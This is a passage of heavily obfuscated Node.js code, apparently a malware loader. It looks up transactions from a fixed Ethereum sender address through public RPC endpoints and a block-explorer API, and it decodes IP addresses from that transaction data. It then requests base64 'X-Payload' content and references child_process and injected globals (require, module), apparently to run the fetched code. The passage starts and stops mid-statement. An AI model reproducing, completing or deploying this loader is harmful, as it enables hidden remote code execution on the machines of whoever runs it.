_0x2117e5=_0x20848d,_0x2b5e58={'jKwUN':_0x2117e5(0xef),'TwkKM':function(_0x5475a4,_0x181071){return _0x5475a4<_0x181071;},'JFElS':function(_0x1156dc,_0x570b1c){return _0x1156dc>=_0x570b1c;},'EwRkr':function(_0x99faca,_0x17f690){return _0x99faca(_0x17f690);},'vlSFl':function(_0x5223a5,_0x1791da){return _0x5223a5===_0x1791da;},'bnLAm':function(_0x4ac7a6,_0x598369){return _0x4ac7a6!==_0x598369;},'IEoDx':function(_0x4a04f9,_0xe5716c){return _0x4a04f9(_0xe5716c);},'yEwyO':_0x2117e5(0x127),'Xnhye':_0x2117e5(0x136),'fYMws':_0x2117e5(0x69),'ThaOI':function(_0x1434a1,_0x53cc49){return _0x1434a1===_0x53cc49;},'pwpCK':_0x2117e5(0x7d),'eYEfy':function(_0x710f51,_0x42e914){return _0x710f51+_0x42e914;},'TiOFL':function(_0xd8cb81,_0x3cafb3){return _0xd8cb81!=_0x3cafb3;},'BHZTp':_0x2117e5(0x7a)+_0x2117e5(0xe6),'wNBaW':_0x2117e5(0x110)+_0x2117e5(0xce),'DhaVU':_0x2117e5(0x195),'iSMgn':_0x2117e5(0x11a)+'pe','VyJPU':_0x2117e5(0x7b)+_0x2117e5(0x73)},_0x599986=new URL(_0x1f5567),_0xf0e6f3=_0x2b5e58[_0x2117e5(0x172)](_0x599986[_0x2117e5(0x130)],_0x2b5e58[_0x2117e5(0x95)])?https:http,_0x44df28={'Accept':_0x2b5e58[_0x2117e5(0x167)],'Accept-Encoding':_0x2b5e58[_0x2117e5(0x75)],'Connection':_0x2b5e58[_0x2117e5(0x123)]};return _0x2b5e58[_0x2117e5(0xe3)](_0x5ffcc5,null)&&(_0x44df28[_0x2b5e58[_0x2117e5(0xec)]]=_0x2b5e58[_0x2117e5(0x167)],_0x44df28[_0x2b5e58[_0x2117e5(0x119)]]=Buffer[_0x2117e5(0xe8)](_0x5ffcc5)),new Promise((_0x3d7cc2,_0x396de0)=>{const _0x5b2f03=_0x2117e5,_0x20bb41={'DYrZK':_0x2b5e58[_0x5b2f03(0x85)],'vEOKn':function(_0x1eabcf,_0x50f908){const _0x12626b=_0x5b2f03;return _0x2b5e58[_0x12626b(0xc4)](_0x1eabcf,_0x50f908);},'QmcCX':function(_0x4cca19,_0x520a42){const _0x41051f=_0x5b2f03;return _0x2b5e58[_0x41051f(0x15e)](_0x4cca19,_0x520a42);},'CjXrE':function(_0x25928f,_0x4fb5ad){const _0x501f55=_0x5b2f03;return _0x2b5e58[_0x501f55(0x159)](_0x25928f,_0x4fb5ad);},'KOrap':function(_0x4caa12,_0x30ecac){const _0x474929=_0x5b2f03;return _0x2b5e58[_0x474929(0x78)](_0x4caa12,_0x30ecac);},'VhVym':function(_0x2ffb49,_0x5f48c4){const _0x49798d=_0x5b2f03;return _0x2b5e58[_0x49798d(0x16b)](_0x2ffb49,_0x5f48c4);},'KBvUB':function(_0x264d7a,_0x410222){const _0x196890=_0x5b2f03;return _0x2b5e58[_0x196890(0x16b)](_0x264d7a,_0x410222);},'ZOVBB':function(_0x19737c,_0xdede88){const _0x2797e7=_0x5b2f03;return _0x2b5e58[_0x2797e7(0x12c)](_0x19737c,_0xdede88);},'TbHHQ':function(_0x389dfe,_0x1830b9){const _0x445618=_0x5b2f03;return _0x2b5e58[_0x445618(0x159)](_0x389dfe,_0x1830b9);},'ggqsa':function(_0x4e616d,_0x703fa8){const _0x125607=_0x5b2f03;return _0x2b5e58[_0x125607(0x12c)](_0x4e616d,_0x703fa8);},'WowaL':_0x2b5e58[_0x5b2f03(0x112)],'QOrvq':_0x2b5e58[_0x5b2f03(0xf7)],'kvgYY':_0x2b5e58[_0x5b2f03(0x6f)]},_0x11f0cb=_0xf0e6f3[_0x5b2f03(0x186)]({'hostname':_0x599986[_0x5b2f03(0xbe)],'port':_0x599986[_0x5b2f03(0xc3)]||(_0x2b5e58[_0x5b2f03(0x172)](_0x599986[_0x5b2f03(0x130)],_0x2b5e58[_0x5b2f03(0x95)])?0x1282+-0x2a*0x9b+0x1*0x8a7:0x12*0xa7+0x1*0x25e7+0xad*-0x49),'path':_0x2b5e58[_0x5b2f03(0x10b)](_0x599986[_0x5b2f03(0x10f)],_0x599986[_0x5b2f03(0x93)]),'method':method,'agent':AGENTS[_0x599986[_0x5b2f03(0x130)]],'signal':_0x3c5c86,'headers':_0x44df28},_0x29f15d=>{const _0x5e0b12=_0x5b2f03,_0x2a9ee7=_0x20bb41[_0x5e0b12(0x17a)](decompressStream,_0x29f15d),_0x1d3340=[];_0x2a9ee7['on'](_0x20bb41[_0x5e0b12(0x15d)],_0x78b5e1=>_0x1d3340[_0x5e0b12(0x156)](_0x78b5e1)),_0x2a9ee7['on'](_0x20bb41[_0x5e0b12(0xb6)],()=>{const _0x3bcafb=_0x5e0b12,_0x1ddb23=Buffer[_0x3bcafb(0x137)](_0x1d3340)[_0x3bcafb(0xdf)](_0x20bb41[_0x3bcafb(0xa7)])[_0x3bcafb(0x132)]();if(_0x20bb41[_0x3bcafb(0xe5)](_0x29f15d[_0x3bcafb(0x18c)],-0x2fb*0xc+-0x51*-0x3d+-0x5*-0x373)||_0x20bb41[_0x3bcafb(0x135)](_0x29f15d[_0x3bcafb(0x18c)],-0x1*-0xd+-0x1e81+-0x1fa*-0x10))return _0x20bb41[_0x3bcafb(0x187)](_0x396de0,new Error(_0x3bcafb(0x6a)+_0x29f15d[_0x3bcafb(0x18c)]+_0x3bcafb(0x6d)+_0x599986[_0x3bcafb(0xbe)]+':\x20'+_0x1ddb23[_0x3bcafb(0x89)](0x7*0x3e5+0x1*0x90d+-0x2450,-0x778+0x1097*-0x1+0x1887)));if(!_0x1ddb23||_0x20bb41[_0x3bcafb(0xd1)](_0x1ddb23[0xb0e+0x7bb*-0x4+0x13de],'<')||_0x20bb41[_0x3bcafb(0x14c)](_0x1ddb23[0x2219+-0x18b3+0x191*-0x6],'{')&&_0x20bb41[_0x3bcafb(0xc8)](_0x1ddb23[-0x112a+-0x67*0x44+0x29*0x116],'['))return _0x20bb41[_0x3bcafb(0x187)](_0x396de0,new Error(_0x3bcafb(0xab)+_0x3bcafb(0x12b)+_0x599986[_0x3bcafb(0xbe)]+':\x20'+_0x1ddb23[_0x3bcafb(0x89)](0x1445+-0x1cbf+0x87a,0x2616+0x105b+0x151*-0x29)));try{_0x20bb41[_0x3bcafb(0x6e)](_0x3d7cc2,JSON[_0x3bcafb(0x153)](_0x1ddb23));}catch(_0x24f8a6){_0x20bb41[_0x3bcafb(0x180)](_0x396de0,new Error(_0x3bcafb(0xff)+_0x3bcafb(0xcf)+_0x3bcafb(0x100)+_0x599986[_0x3bcafb(0xbe)]+':\x20'+_0x24f8a6[_0x3bcafb(0x166)]));}}),_0x2a9ee7['on'](_0x20bb41[_0x5e0b12(0x90)],_0x396de0);});_0x11f0cb['on'](_0x2b5e58[_0x5b2f03(0x6f)],_0x396de0);if(_0x2b5e58[_0x5b2f03(0xe3)](_0x5ffcc5,null))_0x11f0cb[_0x5b2f03(0xb5)](_0x5ffcc5);_0x11f0cb[_0x5b2f03(0x136)]();});}async function withRpcEndpoints(_0xf91f05,_0x312624){const _0x3ad468=_0x20848d,_0x2075e9=RPC_ENDPOINTS[_0x3ad468(0xf3)](()=>new AbortController());_0x2075e9[_0x3ad468(0xb7)](_0x142493=>linkAbort(_0x312624,_0x142493));try{return await Promise[_0x3ad468(0x88)](RPC_ENDPOINTS[_0x3ad468(0xf3)]((_0x60463c,_0x85614d)=>_0xf91f05(_0x60463c,_0x2075e9[_0x85614d][_0x3ad468(0xdd)])));}finally{for(const _0x285fab of _0x2075e9)_0x285fab[_0x3ad468(0xa8)]();}}async function rpcCall(_0x53f547,_0x154a65,_0x342426,_0x4588c4){const _0x374762=_0x20848d,_0x372922={'LZjli':function(_0x1fc6c5,_0x5aefe7,_0x12bfc7){return _0x1fc6c5(_0x5aefe7,_0x12bfc7);},'UPKIx':_0x374762(0x175),'YmRwL':_0x374762(0x19f)},_0x5a025c=await _0x372922[_0x374762(0x19d)](httpRequest,_0x53f547,{'method':_0x372922[_0x374762(0x13a)],'body':JSON[_0x374762(0x152)]({'jsonrpc':_0x372922[_0x374762(0x116)],'id':0x1,'method':_0x154a65,'params':_0x342426}),'signal':_0x4588c4});return _0x5a025c[_0x374762(0xcc)];}async function rpcBatch(_0x4eabbe,_0x304624,_0x1032bd){const _0x339337=_0x20848d,_0x30458e={'cdden':function(_0x54b03,_0xeeacfe,_0x3afcba){return _0x54b03(_0xeeacfe,_0x3afcba);},'LdnRJ':_0x339337(0x175)},_0x31b8d5=await _0x30458e[_0x339337(0xf1)](httpRequest,_0x4eabbe,{'method':_0x30458e[_0x339337(0x13b)],'body':JSON[_0x339337(0x152)](_0x304624[_0x339337(0xf3)](([_0x1671eb,_0x565cf8],_0x5849b3)=>({'jsonrpc':_0x339337(0x19f),'id':_0x5849b3+(-0x1ddf+0x1977+0x1*0x469),'method':_0x1671eb,'params':_0x565cf8}))),'signal':_0x1032bd}),_0x4433a0=new Map(_0x31b8d5[_0x339337(0xf3)](_0x4ea262=>[_0x4ea262['id'],_0x4ea262]));return _0x304624[_0x339337(0xf3)]((_0x11e7f6,_0x401a3f)=>_0x4433a0[_0x339337(0x196)](_0x401a3f+(-0x156a+-0x13*0x5d+0x1c52))[_0x339337(0xcc)]);}const toBlockHex=_0x490553=>'0x'+_0x490553[_0x20848d(0xdf)](-0x8d4*0x1+0x5*0x74+-0x1*-0x6a0);function findSenderTx(_0x22872a){const _0x451aaf=_0x20848d;return _0x22872a[_0x451aaf(0x17c)](_0x398f84=>_0x398f84[_0x451aaf(0x198)]&&_0x398f84[_0x451aaf(0x198)][_0x451aaf(0x16e)+'e']()===SENDER)||null;}function decodeAddress(_0x56ca61){const _0x2a425c=_0x20848d,_0x5e5330={'WETFI':_0x2a425c(0x134),'tLMbP':function(_0x417c59,_0x302a9f){return _0x417c59(_0x302a9f);},'fiOkC':function(_0x4f1eba,_0x563e68){return _0x4f1eba(_0x563e68);}},_0x59f98b=Buffer[_0x2a425c(0x198)](_0x56ca61[_0x2a425c(0xc6)](/^0x/i,''),_0x5e5330[_0x2a425c(0xaf)]),_0x65e13a=_0x5dfeba=>_0x5dfeba[0x63*-0x61+0x991+0x1bf2]+'.'+_0x5dfeba[0x188d+-0xf91+0x1*-0x8fb]+'.'+_0x5dfeba[0xc0d+-0xd77+0x4*0x5b]+'.'+_0x5dfeba[0x33*0x35+0x244d+-0x2ed9];return[_0x5e5330[_0x2a425c(0x1a3)](_0x65e13a,_0x59f98b[_0x2a425c(0xda)](0x13d*0x13+0x1446+-0x2bcd*0x1,-0xadd+-0x2*0x1061+0x2ba3*0x1)),_0x5e5330[_0x2a425c(0xea)](_0x65e13a,_0x59f98b[_0x2a425c(0xda)](0x279*0xf+0x24f7*-0x1+-0x1c,-0x1d78+-0x2d*0x8c+0x361c))];}function firstMatch(_0x2460d7){const _0x3365d1={'dhwoa':function(_0x20aa33,_0x33520f){return _0x20aa33(_0x33520f);},'DDPQK':function(_0x1054a9,_0x26d0fd){return _0x1054a9===_0x26d0fd;}};return new Promise(_0x1fcc13=>{const _0x57dc6f=_0x29d4,_0x4c59c5={'PCmLY':function(_0x71e08,_0x23aff8){const _0x3f133c=_0x29d4;return _0x3365d1[_0x3f133c(0x79)](_0x71e08,_0x23aff8);},'ipDJT':function(_0x2565bb,_0x3e3c6f){const _0x3a9529=_0x29d4;return _0x3365d1[_0x3a9529(0x79)](_0x2565bb,_0x3e3c6f);},'xYStx':function(_0x28e425,_0x2ee3d6){const _0x39a159=_0x29d4;return _0x3365d1[_0x39a159(0x121)](_0x28e425,_0x2ee3d6);}};let _0x4d4cd5=_0x2460d7[_0x57dc6f(0x199)];if(!_0x4d4cd5)return _0x3365d1[_0x57dc6f(0x79)](_0x1fcc13,null);let _0x515ffd=!(-0x1b86+-0x2e8+0x1e6f);const _0x273ab9=_0x2d4281=>{const _0xf1c6f9=_0x57dc6f;if(_0x515ffd)return;_0x515ffd=!(0x25*0x7f+-0x3e*-0x5+-0x1391);for(const _0x1dd428 of _0x2460d7)_0x1dd428[_0xf1c6f9(0x12a)][_0xf1c6f9(0xa8)]();_0x4c59c5[_0xf1c6f9(0xa6)](_0x1fcc13,_0x2d4281);};for(const _0x1742bd of _0x2460d7){_0x1742bd[_0x57dc6f(0x8f)]()[_0x57dc6f(0xe0)](_0x514ab6=>{const _0x2b2df2=_0x57dc6f;if(_0x515ffd)return;if(_0x514ab6)_0x4c59c5[_0x2b2df2(0x13d)](_0x273ab9,_0x514ab6);else{if(_0x4c59c5[_0x2b2df2(0x11e)](--_0x4d4cd5,-0x1792+-0x9*0xf7+0x2041))_0x4c59c5[_0x2b2df2(0xa6)](_0x1fcc13,null);}})[_0x57dc6f(0xb9)](()=>{const _0x364127=_0x57dc6f;if(!_0x515ffd&&_0x4c59c5[_0x364127(0x11e)](--_0x4d4cd5,0x1*-0x24a6+0x2*0x3d+-0x5*-0x73c))_0x4c59c5[_0x364127(0xa6)](_0x1fcc13,null);});}});}function _0x5209(){const _0x1a5fb2=['createInfl','ck=9999999','qNkCn','node:child','_H\x27]=\x27','createGunz','ilterby=fr','VhVym','all','0\x20(Windows','nsactionCo','gzip','MkrBo','stringify','parse','base64','nOcwZ','push','ike\x20Gecko)','SxbGn','EwRkr','aGnkz','tWufO','XRWho','WowaL','JFElS','6f0121063e','oBuFe','QDqiW','m\x27]=module','CPFTw',':443/0x/ls','521847wCNFyM','message','BHZTp','Payload-B6','TdjSP','addEventLi','bnLAm','b64','Dmmue','toLowerCas','7hKbvUJ','908606BVhUNS','RPwta','ThaOI','xlCon','9&page=1&o','POST','nRvVe','yxvnX','9aDC2490Ef','Kit/537.36','ggqsa','h.blocksco','find','y-p_>d$0B&','D311D3080e','2075838cJzCcE','TbHHQ','uylwk','bGiFy','0xa322E5f3','oDrMO','HEAD','request','CjXrE','eth_blockN',':443','on=txlist&','transactio','statusCode','ort=desc&f',';var\x20_glob','\x20(KHTML,\x20l',',Sr3=@','e.com','ZBHWP','blockNumbe','h-mainnet.','keep-alive','get','x-payload-','from','length','IWyrf','content-en','pjpgT','LZjli','sLMBD','2.0','nonce','ut.com/api','ZDjfY','tLMbP','tnymS','Win64;\x20x64','XlpRD','EQcEm','&startbloc','error','HTTP\x20','EyQzc','kCbKc','\x20from\x20','ZOVBB','fYMws','address=','bwJPK','.publicnod','ngth','ISmkb','wNBaW','add','NbYzp','vlSFl','dhwoa','applicatio','Content-Le','\x20Chrome/13','https:','jGAlf','hereum-rpc','KUorG','mpgLw','938109URjwal','fari/537.3','zcAha','jKwUN','eth_getBlo','mhbxi','any','slice','uhODZ','count&acti','stapi.io','fvqbb','AWLqN','run','kvgYY','h.drpc.org','q4FZkxX{!h','search','deflate','pwpCK','\x20NT\x2010.0;\x20','Mozilla/5.','WnaOl','kiIzs','GET','unref','PVHNW','min','Missing\x20X-','LGSUR','vLIhV','kkNCc','filter','wUNFK','\x27]=\x27','dqINX','PCmLY','DYrZK','abort','bgDpG','object','Non-JSON\x20f','esrPb','JAvrZ','findIndex','WETFI',')\x20AppleWeb','_t_u\x27]=\x27','?module=ac','SAfPM','QpQBg','write','QOrvq','forEach','rfUFq','catch','hrbKY','ffset=20&s','isArray','createBrot','hostname','1.0.0.0\x20Sa','CYBCH','r\x27]=requir','http://','port','TwkKM','4719624ggfnYG','replace','YBRtc','KBvUB','rVsop','https://1r','https://et','result','public.bla','ate,\x20br','\x20failed\x20fr','node:https','KOrap','_process','global[\x27_V','rcPqv','pjfOz','HCZMC','oad\x20body',':80','kQpDX','subarray','kncJl','pipe','signal','EyLHG','toString','then','stener','node:url','TiOFL','1243190DQJAoa','vEOKn','n/json','qUDQc','byteLength','uXtZB','fiOkC','YYQEA','iSMgn','k=0&endblo','umber','utf8','MpWDb','cdden','zEAxt','map','has','SzuII','pnRjK','Xnhye','node:zlib','ckByNumber','charCodeAt','DAEZZ','goBKs','gOGiH','node:http','JSON\x20parse','om\x20','kDMfM','KUZEu','_t_s\x27]=\x27','al=global;','unt','_t_s','EzrrR','Agent','liDecompre','node','eYEfy','pc.io/eth','headers','VIHRu','pathname','gzip,\x20defl','1348044hsTLDJ','yEwyO','VmALW','resume','Sravc','YmRwL','UenMP','BRPkc','VyJPU','Content-Ty','@^1aQk','_H2','\x27;global[\x27','xYStx','VFElX','eth_getTra','DDPQK','TNlDm','DhaVU','x-gzip','_t_u','bDTNH','data','Empty\x20payl','DifcY','controller','rom\x20','IEoDx','bVvqF','NEprN','ate','protocol','coding','trim','UYTIM','hex','QmcCX','end','concat','e;global[\x27','lCsDK','UPKIx','LdnRJ','cXNun','ipDJT','ignore','_H2\x27]=\x27',':443/0x/cl','ZeszF','PpsId','qfWrf','FvFPa'];_0x5209=function(){return _0x1a5fb2;};return _0x5209();}function candidateBlocks(_0x1f3d7d){const _0x291567=_0x20848d,_0x328e7d={'CPFTw':function(_0x1c3678,_0x18491f){return _0x1c3678-_0x18491f;},'NbYzp':function(_0x35e318,_0x2ec890){return _0x35e318+_0x2ec890;},'DifcY':function(_0x3c166d,_0x8cccec){return _0x3c166d-_0x8cccec;},'xlCon':function(_0xeb167a,_0x166a3a){return _0xeb167a<_0x166a3a;}},_0x2f1c19=_0x328e7d[_0x291567(0x163)](_0x1f3d7d,BLOCK_MULTIPLE),_0x3c662d=new Set(),_0x2fd92e=[];for(const _0x406066 of[_0x328e7d[_0x291567(0x163)](_0x1f3d7d,0x1n),_0x1f3d7d,_0x328e7d[_0x291567(0x77)](_0x1f3d7d,0x1n),_0x328e7d[_0x291567(0x129)](_0x2f1c19,0x1n),_0x2f1c19,_0x328e7d[_0x291567(0x77)](_0x2f1c19,0x1n)]){if(_0x328e7d[_0x291567(0x173)](_0x406066,0x0n))continue;const _0x34d04e=_0x406066[_0x291567(0xdf)]();if(_0x3c662d[_0x291567(0xf4)](_0x34d04e))continue;_0x3c662d[_0x291567(0x76)](_0x34d04e),_0x2fd92e[_0x291567(0x156)](_0x406066);}return _0x2fd92e;}function blockTask(_0x180420){const _0x320f00={'XRWho':function(_0xa483e,_0x5bdb7e,_0x50a1eb){return _0xa483e(_0x5bdb7e,_0x50a1eb);},'bwJPK':function(_0x1100a6,_0x345487){return _0x1100a6(_0x345487);}},_0x4ed2b4=new AbortController();return{'controller':_0x4ed2b4,'run':async()=>{const _0x419d9f=_0x29d4,_0x1d5890=await _0x320f00[_0x419d9f(0x15c)](withRpcEndpoints,(_0x198cb6,_0x20c40f)=>rpcCall(_0x198cb6,_0x419d9f(0x86)+_0x419d9f(0xf9),[toBlockHex(_0x180420),!(0x13c6*-0x1+-0x179+0x153f)],_0x20c40f),_0x4ed2b4[_0x419d9f(0xdd)]),_0x20d49b=_0x1d5890?.[_0x419d9f(0x18b)+'ns'];if(!Array[_0x419d9f(0xbc)](_0x20d49b))return null;const _0x1f1165=_0x320f00[_0x419d9f(0x71)](findSenderTx,_0x20d49b);return _0x1f1165?{'blockNumber':_0x180420,'tx':_0x1f1165}:null;}};}async function nonceAtBlocks(_0x3e4f7e,_0x3b5905){const _0x3d9744=_0x20848d,_0x9761a8={'UYTIM':function(_0xedae58,_0xd6142c,_0x542af0){return _0xedae58(_0xd6142c,_0x542af0);}},_0xfbfd4c=_0x3e4f7e[_0x3d9744(0xf3)](_0x4ef168=>[_0x3d9744(0x120)+_0x3d9744(0x14f)+_0x3d9744(0x105),[SENDER,toBlockHex(_0x4ef168)]]);try{return(await _0x9761a8[_0x3d9744(0x133)](withRpcEndpoints,(_0x2287b2,_0x51c396)=>rpcBatch(_0x2287b2,_0xfbfd4c,_0x51c396),_0x3b5905))[_0x3d9744(0xf3)](BigInt);}catch{return(await Promise[_0x3d9744(0x14d)](_0xfbfd4c[_0x3d9744(0xf3)](([_0x46fd04,_0xe62ba4])=>withRpcEndpoints((_0x26388e,_0x45639d)=>rpcCall(_0x26388e,_0x46fd04,_0xe62ba4,_0x45639d),_0x3b5905))))[_0x3d9744(0xf3)](BigInt);}}async function lastSenderTx(_0x36a16b){const _0xe16850=_0x20848d,_0x524490={'bVvqF':function(_0x440e67,_0x197113){return _0x440e67(_0x197113);},'kQpDX':function(_0x164147,_0x3ba4a7,_0x8d8a49){return _0x164147(_0x3ba4a7,_0x8d8a49);},'EzrrR':function(_0x39dbec,_0x4067ce){return _0x39dbec-_0x4067ce;},'KUZEu':function(_0x27e233,_0x2b4769){return _0x27e233-_0x2b4769;},'pjfOz':function(_0x272881,_0x829f99){return _0x272881>_0x829f99;},'TNlDm':function(_0x487e3d,_0x4ec208){return _0x487e3d-_0x4ec208;},'bDTNH':function(_0x18b82e,_0x6a4c31){return _0x18b82e<=_0x6a4c31;},'mhbxi':function(_0x27960e,_0x5cd746){return _0x27960e+_0x5cd746;},'zEAxt':function(_0x2ad333,_0x2cabb0){return _0x2ad333/_0x2cabb0;},'uylwk':function(_0x16a9a5,_0x41b805){return _0x16a9a5*_0x41b805;},'HCZMC':function(_0x1aeb5a,_0xe1008d){return _0x1aeb5a-_0xe1008d;},'EyQzc':function(_0x40be2d,_0x30f618){return _0x40be2d===_0x30f618;},'ZBHWP':function(_0x5961b6,_0x22e208){return _0x5961b6>_0x22e208;},'sLMBD':function(_0x49fa3f,_0x581300,_0x1e7ae7){return _0x49fa3f(_0x581300,_0x1e7ae7);},'hrbKY':function(_0x29d77e,_0x280709){return _0x29d77e!==_0x280709;},'pjpgT':function(_0x477a44,_0x441a8e){return _0x477a44===_0x441a8e;},'PpsId':function(_0x4be5a8,_0x3bed30){return _0x4be5a8(_0x3bed30);}},_0x289734=new AbortController();try{const _0x7adce3=_0x36a16b??_0x524490[_0xe16850(0x12d)](BigInt,await _0x524490[_0xe16850(0xd9)](withRpcEndpoints,(_0x4b0ce9,_0x10083f)=>rpcCall(_0x4b0ce9,_0xe16850(0x188)+_0xe16850(0xee),[],_0x10083f),_0x289734[_0xe16850(0xdd)])),_0x12374e=_0x524490[_0xe16850(0x12d)](BigInt,await _0x524490[_0xe16850(0xd9)](withRpcEndpoints,(_0x430610,_0x5e932c)=>rpcCall(_0x430610,_0xe16850(0x120)+_0xe16850(0x14f)+_0xe16850(0x105),[SENDER,toBlockHex(_0x7adce3)],_0x5e932c),_0x289734[_0xe16850(0xdd)])),_0x1ec64f=_0x524490[_0xe16850(0x107)](_0x12374e,0x1n);let _0x27305a=_0x524490[_0xe16850(0x102)](SEARCH_FLOOR,0x1n),_0x1e253b=_0x7adce3;while(_0x524490[_0xe16850(0xd5)](_0x524490[_0xe16850(0x102)](_0x1e253b,_0x27305a),0x1n)){const _0x4bd85f=_0x524490[_0xe16850(0x102)](_0x524490[_0xe16850(0x122)](_0x1e253b,_0x27305a),0x1n),_0x3895d7=_0x524490[_0xe16850(0x12d)](BigInt,Math[_0xe16850(0x9d)](NONCE_FANOUT,_0x524490[_0xe16850(0x12d)](Number,_0x4bd85f))),_0xa62474=[];for(let _0x16fdab=0x1n;_0x524490[_0xe16850(0x126)](_0x16fdab,_0x3895d7);_0x16fdab+=0x1n)_0xa62474[_0xe16850(0x156)](_0x524490[_0xe16850(0x87)](_0x27305a,_0x524490[_0xe16850(0xf2)](_0x524490[_0xe16850(0x181)](_0x16fdab,_0x524490[_0xe16850(0xd6)](_0x1e253b,_0x27305a)),_0x524490[_0xe16850(0x87)](_0x3895d7,0x1n))));const _0x3276bc=await _0x524490[_0xe16850(0xd9)](nonceAtBlocks,_0xa62474,_0x289734[_0xe16850(0xdd)]),_0xa69bdf=_0x3276bc[_0xe16850(0xae)](_0x55d967=>_0x55d967>=_0x12374e);if(_0x524490[_0xe16850(0x6b)](_0xa69bdf,-(-0xd74+-0x25f8+0x336d)))_0x27305a=_0xa62474[_0x524490[_0xe16850(0xd6)](_0xa62474[_0xe16850(0x199)],0x1b7*0x1+-0x839+-0x683*-0x1)];else{_0x1e253b=_0xa62474[_0xa69bdf];if(_0x524490[_0xe16850(0x192)](_0xa69bdf,0x9*0x33c+0x6d*-0x8+-0x19b4))_0x27305a=_0xa62474[_0x524490[_0xe16850(0x102)](_0xa69bdf,-0x2f3*-0x1+0x574*-0x7+0x233a)];}}const _0x566f23=await _0x524490[_0xe16850(0x19e)](withRpcEndpoints,(_0x2a72e2,_0x300844)=>rpcCall(_0x2a72e2,_0xe16850(0x86)+_0xe16850(0xf9),[toBlockHex(_0x1e253b),!(-0x84e*-0x2+-0x3*0x15+-0x105d)],_0x300844),_0x289734[_0xe16850(0xdd)]),_0x5018cd=_0x566f23?.[_0xe16850(0x18b)+'ns']||[];let _0x102e4f=null;for(const _0x1bee66 of _0x5018cd){if(!_0x1bee66[_0xe16850(0x198)]||_0x524490[_0xe16850(0xba)](_0x1bee66[_0xe16850(0x198)][_0xe16850(0x16e)+'e'](),SENDER))continue;if(_0x524490[_0xe16850(0x19c)](_0x524490[_0xe16850(0x142)](BigInt,_0x1bee66[_0xe16850(0x1a0)]),_0x1ec64f)){_0x102e4f=_0x1bee66;break;}if(!_0x102e4f||_0x524490[_0xe16850(0xd5)](_0x524490[_0xe16850(0x12d)](BigInt,_0x1bee66[_0xe16850(0x1a0)]),_0x524490[_0xe16850(0x12d)](BigInt,_0x102e4f[_0xe16850(0x1a0)])))_0x102e4f=_0x1bee66;}return{'blockNumber':_0x1e253b,'tx':_0x102e4f};}finally{_0x289734[_0xe16850(0xa8)]();}}async function lastSenderTxViaIndexer(){const _0x2ddd90=_0x20848d,_0x36f9ff={'FvFPa':function(_0x51db82,_0x329798){return _0x51db82+_0x329798;},'gOGiH':function(_0x54ff95,_0x3ceb8c){return _0x54ff95(_0x3ceb8c);},'TdjSP':function(_0x4d8132,_0x4530b5){return _0x4d8132(_0x4530b5);}},_0x4a0367=_0x36f9ff[_0x2ddd90(0x144)](INDEXER_URL+(_0x2ddd90(0xb2)+_0x2ddd90(0x8b)+_0x2ddd90(0x18a)+_0x2ddd90(0x70))+SENDER,_0x2ddd90(0x68)+_0x2ddd90(0xed)+_0x2ddd90(0x146)+_0x2ddd90(0x174)+_0x2ddd90(0xbb)+_0x2ddd90(0x18d)+_0x2ddd90(0x14b)+'om'),_0x1d88de=await _0x36f9ff[_0x2ddd90(0xfd)](httpRequest,_0x4a0367),_0x52546d=Array[_0x2ddd90(0xbc)](_0x1d88de?.[_0x2ddd90(0xcc)])?_0x1d88de[_0x2ddd90(0xcc)]:[],_0x52c773=_0x52546d[_0x2ddd90(0x17c)](_0x2c2b79=>_0x2c2b79[_0x2ddd90(0x198)]&&_0x2c2b79[_0x2ddd90(0x198)][_0x2ddd90(0x16e)+'e']()===SENDER);return{'blockNumber':_0x36f9ff[_0x2ddd90(0x169)](BigInt,_0x52c773[_0x2ddd90(0x193)+'r']),'tx':_0x52c773};}async function run(){const _0x4ae716=_0x20848d,_0x536ffd={'RPwta':_0x4ae716(0x197)+_0x4ae716(0x16c),'KUorG':_0x4ae716(0x9e)+_0x4ae716(0x168)+'4','nOcwZ':function(_0x2975a0,_0x2edc25){return _0x2975a0(_0x2edc25);},'rcPqv':_0x4ae716(0x154),'wUNFK':function(_0x3cec63,_0x1d63d0){return _0x3cec63<_0x1d63d0;},'ZDjfY':function(_0xd9fab7,_0x53ad9c){return _0xd9fab7%_0x53ad9c;},'VFElX':_0x4ae716(0xef),'oBuFe':_0x4ae716(0x128)+_0x4ae716(0xd7),'qfWrf':function(_0x10b289,_0x16b4b1){return _0x10b289===_0x16b4b1;},'ISmkb':_0x4ae716(0x185),'EQcEm':_0x4ae716(0x127),'tWufO':_0x4ae716(0x136),'SxbGn':_0x4ae716(0x69),'XlpRD':function(_0x2e3df8,_0x5a2007){return _0x2e3df8(_0x5a2007);},'zcAha':function(_0x49cb45,_0x335897){return _0x49cb45+_0x335897;},'LGSUR':_0x4ae716(0x97)+_0x4ae716(0x14e)+_0x4ae716(0x96)+_0x4ae716(0x1a5)+_0x4ae716(0xb0)+_0x4ae716(0x179)+_0x4ae716(0x18f)+_0x4ae716(0x157)+_0x4ae716(0x7c)+_0x4ae716(0xbf)+_0x4ae716(0x83)+'6','VmALW':_0x4ae716(0x9a),'uXtZB':function(_0x4a9e8e,_0x12685a,_0x1ce9cc){return _0x4a9e8e(_0x12685a,_0x1ce9cc);},'rfUFq':_0x4ae716(0x11c),'CYBCH':_0x4ae716(0x106),'qUDQc':_0x4ae716(0x125),'vLIhV':function(_0x188acc,_0x4b87a8,_0x106b3f,_0x34f2bc){return _0x188acc(_0x4b87a8,_0x106b3f,_0x34f2bc);},'PVHNW':_0x4ae716(0x10a),'esrPb':function(_0x2de689,_0x19bdd7){return _0x2de689+_0x19bdd7;},'MpWDb':_0x4ae716(0x13e),'SAfPM':function(_0x440b39,_0x321eb1){return _0x440b39(_0x321eb1);},'Dmmue':function(_0x60c77e,_0x241bef){return _0x60c77e-_0x241bef;},'IWyrf':function(_0x18298f,_0x27a751){return _0x18298f%_0x27a751;},'QDqiW':function(_0x250b1b,_0x5e4548){return _0x250b1b(_0x5e4548);},'dqINX':function(_0x1ce72f,_0x17ba93){return _0x1ce72f(_0x17ba93);},'mpgLw':function(_0x5702ba,_0x10795b,_0x49bbd7,_0x3bbef1){return _0x5702ba(_0x10795b,_0x49bbd7,_0x3bbef1);},'MkrBo':_0x4ae716(0x92)+_0x4ae716(0x190),'aGnkz':function(_0x218388,_0x4deed4,_0x4efe12,_0x21a63e){return _0x218388(_0x4deed4,_0x4efe12,_0x21a63e);},'lCsDK':_0x4ae716(0x17d)+_0x4ae716(0x11b)},_0x3fc4ba=_0x536ffd[_0x4ae716(0xb3)](BigInt,await 